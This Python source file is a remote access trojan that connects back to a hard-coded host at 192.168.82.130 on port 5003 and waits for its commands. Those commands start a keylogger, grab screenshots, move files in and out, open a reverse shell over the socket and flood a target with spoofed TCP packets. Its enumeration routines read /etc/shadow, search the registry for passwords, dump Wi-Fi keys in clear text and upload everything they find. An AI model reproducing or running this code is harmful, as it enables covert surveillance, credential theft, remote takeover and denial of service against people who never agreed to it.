import os,json,subprocess,sys,threading,random,socket
from urllib.request import Request, urlopen
try:
	from pynput.keyboard import Listener
	from PIL import ImageGrab
	from scapy.all import *
except:
	os.system("pip install PIL")
	os.system("pip install pynput")
	os.system("pip install scapy")
	from pynput.keyboard import Listener
	from PIL import ImageGrab
	from scapy.all import *

keys = []
count = 0
# path_windos = "\\Keyloags.txt"
path_unix = "/tmp/keyloags.txt"
if "nt" in os.name:
        p=subprocess.Popen('powershell $env:TEMP', shell=False, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = p.stdout.read()
        output = output.decode()
        o=output.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
        path_unix = o+"\\keyloags.txt"
else:
	path_unix = "/tmp/keyloags.txt"
global flage
flage=0
def write_file(keys):
	with open(path_unix,'a') as wfile:
		for key in keys:
			k = str(key).replace("'","")
			if(k.find('backspace') > 0):
				wfile.write(" Backspace ")
			elif(k.find('enter') > 0):
				wfile.write("\n")
			elif(k.find('shift') > 0):
				wfile.write(" Shift ")
			elif(k.find('space') > 0):
				wfile.write("    ")
			elif(k.find('caps_lock') > 0):
				wfile.write(" Caps_lock ")
			elif(k.find('up') > 0):
				wfile.write(" Key.up ")
			elif(k.find('down') > 0):
				wfile.write(" Key.down ")
			elif(k.find('right') > 0):
				wfile.write(" Key.right ")
			elif(k.find('lefts') > 0):
				wfile.write(" Key.lefts ")
			elif(k.find('ctrl_r') > 0):
				wfile.write(" Key.ctrl_r ")
			elif(k.find('tab') > 0):
				wfile.write(" Key.tab ")
			elif(k.find('alt') > 0):
				wfile.write(" Key.alt ")
			elif(k.find('key')):
				wfile.write(k)

def on_press(key):
	global keys,count
	keys.append(key)
	count += 1
	if(count >=1):
		count = 0
		write_file(keys)
		keys = []
def key_logs():
	os.remove(path_unix)
	global listener
	with Listener(on_press=on_press) as listener:
		listener.join()
def stop_key_log():
	flage =1
	listener.stop()
	upload_file(path_unix)
def dos(target_IP,stop):
	# target_IP = input("Enter IP address of Target: ")
	i = 1
	while True:
		a = str(random.randint(1, 254))
		b = str(random.randint(1, 254))
		c = str(random.randint(1, 254))
		d = str(random.randint(1, 254))
		dot = "."
		Source_ip = a + dot + b + dot + c + dot + d
		for source_port in range(1, 65535):
			IP1 = IP(source_IP=Source_ip, destination=target_IP)
			TCP1 = TCP(srcport=80, dstport=80)
			pkt = IP1 / TCP1
			send(pkt, inter=.001)
			connt.send("packet sent "+str(i))
			i = i + 1
			if(stop==i):
				break
def full_shell():
	# print(port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
	s.connect((host, port + 1));
	# reliable_send(li)
	os.dup2(s.fileno(), 0);
	os.dup2(s.fileno(), 1);
	os.dup2(s.fileno(), 2);
	if "nt" in os.name:
		p = subprocess.call(["cmd.exe", ""]);
	else:	
		p = subprocess.call(["/bin/sh", "-i"]);
def screen_shoter():
	screen_shot = ImageGrab.grab()
	if "nt" in os.name:
		p=subprocess.Popen('powershell $env:TEMP', shell=False, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = p.stdout.read()
		output = output.decode()
		o=output.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
		screen_shot.save(o+"\\screep.png")
	else:
		screen_shot.save("/temp/screep.png")

def  upload_file(file_name):
	f= open(file_name,'rb')
	connt.send(f.read())

def download_file(file_name):

	k="/"
	if "nt" in os.name:
		k="\\"
	else:
		k="/"
	c=0
	while True:
		if ("/" in k or "\\" in k):
			k = file_name[c:]
			c += 1
			# print("her", k)
			# print(c)
		else:
			break
	# print(k)
	f=open(k,"wb")
	# print('kkkk')
	connt.settimeout(1)
	chunk = connt.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = connt.recv(1024)
		except socket.timeout as e:
			break
	connt.settimeout(None)
	f.close()

def relaible_recv():
	data = ''
	while True:
		try:
			data =  data + connt.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue
def reliable_send(data):
	jsondata = json.dumps(data)
	connt.send(jsondata.encode())
def shell_do():

	while True:
		command = relaible_recv()
		# print(command)
		if(command=="exit"):
			break
		# if (command == ""):
		# 	pass
		elif (command == "stkeylog"):
			t = threading.Thread(target=key_logs)
			t.start()
			reliable_send("key loger is started")
			# while flage !=1:
			# stop_key_log()
		elif (command == "spkeylog"):
			# t = threading.Thread(taget=key_logs)
			# t.start()
			# while flage !=1:
			stop_key_log()
			t.join()
		elif(command[:3] =="dos"):
			comm = command[4:]
			t_ip= str(comm[0:comm.find(' ')])
			stop_at= int(comm[comm.find(' '):].replace(" ", ""))+1
			dos(t_ip,stop_at)

		elif (command == "screenshoot"):
			screen_shoter()
			if "nt" in os.name:
				p=subprocess.Popen('powershell $env:TEMP', shell=False, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = p.stdout.read()
				output = output.decode()
				o=output.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
				upload_file(o+"\\screep.png")
			else:
				upload_file("/temp/screep.png")
		elif (command[:6] == "upload"):
			download_file(command[7:])
		elif(command[:8] == "download"):
			reliable_send(command)
			upload_file(command[9:])
			# time.sleep(4)
		elif (command == "shell"):
			# while command == "" or command == "shell" or command == None:
			t2 = threading.Thread(target=full_shell)
			t2.start()
			t2.join()
		elif(command == "enum"):
			if "nt" in os.name:
				print("windows")
				f = '''echo #########user info > %temp%\\winenumoutp22.txt
echo ##################Hostname >> %temp%\\winenumoutp22.txt
hostname >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ##################whoami >> %temp%\\winenumoutp22.txt
whoami >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ##################echo %%USERNAME%% >> %temp%\\winenumoutp22.txt
echo %USERNAME% >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ##################net users >> %temp%\\winenumoutp22.txt
net users >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ##################net user %%USERNAME%% >> %temp%\\winenumoutp22.txt
net user %USERNAME% >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## systeminfo >> %temp%\\winenumoutp22.txt
systeminfo >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## fsutil fsinfo drives >> %temp%\\winenumoutp22.txt
fsutil fsinfo drives >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## path >> %temp%\\winenumoutp22.txt
echo %PATH% >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## tasklist /SVC >> %temp%\\winenumoutp22.txt
tasklist /SVC >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Checking if .msi files are always installed with elevated privlidges>> %temp%\\winenumoutp22.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> %temp%\\winenumoutp22.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo #### Checking for backup SAM files >> %temp%\\winenumoutp22.txt

echo #### dir %SYSTEMROOT%\repair\SAM >> %temp%\\winenumoutp22.txt
dir %%SYSTEMROOT%%\repair\SAM >> %temp%\\winenumoutp22.txt

echo #### dir %SYSTEMROOT%\system32\config\regback\SAM >> %temp%\\winenumoutp22.txt
dir %%SYSTEMROOT%%\system32\config\regback\SAM >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo #### USES AccessChk from sysinternals >> %temp%\\winenumoutp22.txt
accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> %temp%\\winenumoutp22.txt
accesschk.exe -uwcqv "Users" * /accepteula >> %temp%\\winenumoutp22.txt
accesschk.exe -uwcqv "Everyone" * /accepteula >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Checking for possible creds >> %temp%\\winenumoutp22.txt

echo ################## type c:\sysprep.inf >> %temp%\\winenumoutp22.txt
type c:\sysprep.inf >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## type c:\sysprep\sysprep.xml>> %temp%\\winenumoutp22.txt
type c:\sysprep\sysprep.xml >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Network Information >> %temp%\\winenumoutp22.txt

echo ################## ipconfig /all >> %temp%\\winenumoutp22.txt
ipconfig /all >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## net use (view current connetions) >> %temp%\\winenumoutp22.txt
net use >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## net share (view shares) >> %temp%\\winenumoutp22.txt
net share >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## arp -a >> %temp%\\winenumoutp22.txt
arp -a >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## route print>> %temp%\\winenumoutp22.txt
route print >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## netstat -nao >> %temp%\\winenumoutp22.txt
netstat -nao >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## netsh firewall show state >> %temp%\\winenumoutp22.txt
netsh firewall show state >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## netsh firewall show config >> %temp%\\winenumoutp22.txt
netsh firewall show config >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Shows wireless network information>> %temp%\\winenumoutp22.txt
netsh wlan export profile key=clear
type wi-fi*.xml >> %temp%\\winenumoutp22.txt
del wi-fi*.xml
echo. >> %temp%\\winenumoutp22.txt


echo ################## schtasks /query /fo LIST /v >> %temp%\\winenumoutp22.txt
schtasks /query /fo LIST /v >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## net start >> %temp%\\winenumoutp22.txt
net start >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## DRIVERQUERY >> %temp%\\winenumoutp22.txt
DRIVERQUERY >> %temp%\\winenumoutp22.txt
echo. >> %temp%\\winenumoutp22.txt

echo ################## Any mentions of "password" in the registry >> %temp%\\winenumoutp22.txt

reg query HKLM /f password  /t REG_SZ  /s >> %temp%\\winenumoutp22.txt

echo. >> %temp%\\winenumoutp22.txt
echo ################## Checking for services >> %temp%\\winenumoutp22.txt
wmic service get name,displayname,pathname,startmode | findstr /i "auto"  >> %temp%\\winenumoutp22.txt
'''
				f2=open("f.bat",'w')
				f2.write(f)
				f2.close()
				f3=open("f.bat","r")
				for i in f3:
					os.system(str(i.replace("\n", '')))
				p=subprocess.Popen('powershell $env:TEMP', shell=False, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = p.stdout.read()
				output = output.decode()
				o=output.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
				upload_file(o+"\\winenumoutp22.txt")
				os.system("powershell rm f.bat")
			else:
				f = '''echo "user_name " >>/tmp/enum55.txt 
whoami >>/tmp/enum55.txt
echo "hostname " >>/tmp/enum55.txt 
hostname >>/tmp/enum55.txt
echo "Kernel information " >>/tmp/enum55.txt 
uname -a >>/tmp/enum55.txt
cat /proc/version >>/tmp/enum55.txt
cat /etc/*-release >>/tmp/enum55.txt
echo "user id  " >>/tmp/enum55.txt 
id >>/tmp/enum55.txt
echo "last logged on user information " >>/tmp/enum55.txt
lastlog >>/tmp/enum55.txt
echo "logs  " >>/tmp/enum55.txt 
w >>/tmp/enum55.txt
echo "see passwd  " >>/tmp/enum55.txt 
cat /etc/shadow >>/tmp/enum55.txt
cat /etc/passwd >>/tmp/enum55.txt
echo "grpinfo  " >>/tmp/enum55.txt 
echo -e "$grpinfo" | grep adm >>/tmp/enum55.txt
echo "installed dpkg  " >>/tmp/enum55.txt 
dpkg -l >>/tmp/enum55.txt
echo "files that has sudo  " >>/tmp/enum55.txt 
echo "" | sudo -S -l -k >>/tmp/enum55.txt
echo "directory permissions  " >>/tmp/enum55.txt 
ls -ahl /home/ >>/tmp/enum55.txt
ls -ahl >>/tmp/enum55.txt
echo "cronjub enum " >>/tmp/enum55.txt 
ls -la /etc/cron* >>/tmp/enum55.txt
cat /etc/crontab >>/tmp/enum55.txt
echo "service enum " >>/tmp/enum55.txt 
systemctl list-timers --all >>/tmp/enum55.txt
systemctl list-timers  |head -n -1     >>/tmp/enum55.txt
echo "network enum " >>/tmp/enum55.txt 
/sbin/ifconfig -a >>/tmp/enum55.txt
/sbin/ip a  >>/tmp/enum55.txt
arp -a >>/tmp/enum55.txt
ip n >>/tmp/enum55.txt
grep "nameserver" /etc/resolv.conf >>/tmp/enum55.txt
systemd-resolve --status 2 >>/tmp/enum55.txt
netstat -ntpl >>/tmp/enum55.txt
ss -t -l -n >>/tmp/enum55.txt
netstat -nupl >>/tmp/enum55.txt
ss -u -l -n >>/tmp/enum55.txt
echo "running proces " >>/tmp/enum55.txt 
ps aux >>/tmp/enum55.txt
echo "database enum " >>/tmp/enum55.txt 
mysql --version >>/tmp/enum55.txt
mysqladmin -uroot -proot version >>/tmp/enum55.txt
mysqladmin -uroot version >>/tmp/enum55.txt
psql -V  >>/tmp/enum55.txt
echo "apache enum " >>/tmp/enum55.txt 
apache2 -v >>/tmp/enum55.txt
grep -i "user\|group" /etc/apache2/envvars  >>/tmp/enum55.txt
echo "files enum " >>/tmp/enum55.txt 
find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; >>/tmp/enum55.txt'''
				f2=open("f.sh",'w')
				f2.write(f)
				f2.close()
				f3=open("f.sh","r")

				for i in f3:
					os.system(str(i.replace("\n", '')))
				upload_file("/tmp/enum55.txt")
				os.system("rm f.sh")

		else:
			try:
                                if "nt" in os.name:
                                        command="powershell "+command
                                else:
                                        command=command
                                echut = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE,
										 stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                output = echut.stdout.read() + echut.stderr.read()
                                output = output.decode()
                                reliable_send(output)
			except:
				reliable_send("error")


	
	

while True:
	try:
		host = "192.168.82.130"
		port = 5003
		# if "http" in host:
		# 	url: str = host+"/port.txt"
		# 	header: Dict[str, str] = {
		# 		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
		# 	}
		# 	req1 = Request(url, headers=header)
		# 	req: str = urlopen(req1).read().decode()
		# 	port = int(req)
		# else:
		# 	host = "127.0.0.1"
		# 	port = 5004
		connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connt.connect((host, port))
		shell_do()
	except:
		pass
